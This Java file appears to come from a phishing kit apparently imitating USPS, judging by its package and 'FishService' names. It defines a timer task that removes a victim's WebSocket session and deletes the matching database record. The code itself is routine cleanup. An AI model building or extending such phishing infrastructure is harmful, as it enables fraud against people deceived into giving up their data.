package com.uspsassa.phishing.timer;

import cn.hutool.extra.spring.SpringUtil;
import com.uspsassa.phishing.service.FishService;
import com.uspsassa.phishing.socket.WebSocketServer;

import java.io.IOException;
import java.util.TimerTask;

public class UserDeleteTimer extends TimerTask {
    WebSocketServer webSocketServer;

    public UserDeleteTimer(WebSocketServer webSocketServer) {
        this.webSocketServer = webSocketServer;
    }

    @Override
    public void run() {
        //判断是否登录
        System.out.println("执行删除操作");
        WebSocketServer.getWebSocketSet().remove(webSocketServer);
        //从数据库中移除
        try {
            SpringUtil.getBean(FishService.class).remove(webSocketServer.sid);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
